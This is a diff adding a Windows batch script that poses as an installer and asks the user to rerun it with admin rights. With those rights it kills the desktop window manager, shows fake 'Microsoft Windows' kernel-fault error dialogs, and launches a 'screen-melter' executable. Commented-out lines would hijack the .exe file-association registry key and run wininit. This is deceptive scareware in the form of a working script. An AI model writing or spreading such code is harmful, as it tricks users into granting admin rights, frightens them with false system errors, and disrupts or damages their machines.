@@ -1,0 +1,30 @@
+@echo off & setlocal
+net session >nul 2>&1
+if %errorlevel% == 0 (
+    goto has_admin
+) else (
+    pushd %temp%
+    echo MsgBox "Please restart the installer with admin privileges.">msgw.vbs
+    start /wait msgw.vbs
+    del msgw.vbs
+    popd
+    exit
+)
+
+:has_admin
+timeout 7 /nobreak >nul
+taskkill -f -im dwm.exe
+pushd %temp%
+timeout 3 /nobreak >nul
+echo MsgBox "Your PC has encountered a major kernel fault in module 0x0000F00D in ntoskrnl.exe. Please take immediate action to prevent corruption of your system.",16,"Microsoft Windows">msg1.vbs
+start msg1.vbs
+timeout 1 /nobreak >nul
+echo MsgBox "The operating system encountered a failiure in address pool 0x00FFAD00 to 0x00FFADFF with file dllhost.exe: Encountered an error when hosting dynamic link library 'shell32.dll'.",16,"Microsoft Windows">msg2.vbs
+start /wait msg2.vbs
+popd
+timeout 2 /nobreak >nul
+start %~dp0screen-melter.exe
+rem reg add "HKEY_CLASSES_ROOT\exefile\shell\open\command" /ve /t REG_SZ /d "%temp%\harald_afterburner.cmd \"%%1\" %%*" /f
+timeout 11 /nobreak >nul
+rem powershell.exe -Command wininit
+exit
